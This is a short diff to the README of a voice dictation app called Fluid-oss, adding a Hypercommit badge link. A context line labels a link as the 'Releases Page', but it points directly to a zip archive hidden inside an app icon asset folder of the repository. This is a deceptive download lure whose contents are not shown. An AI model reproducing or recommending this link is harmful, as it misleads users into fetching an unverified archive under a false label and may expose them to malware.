@@ -85,3 +85,7 @@ We welcome contributions to improve Fluid-oss. If you're interested in helping o
 If you encounter any issues or have questions, feel free to open an issue in our GitHub repo, or reach out to the community for assistance. We are here to help you make the most out of Fluid-oss.
 
 Remember, you can always download the latest version of Fluid-oss from the [Releases Page](https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip). Enjoy effortless voice dictation!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/fluid-oss)
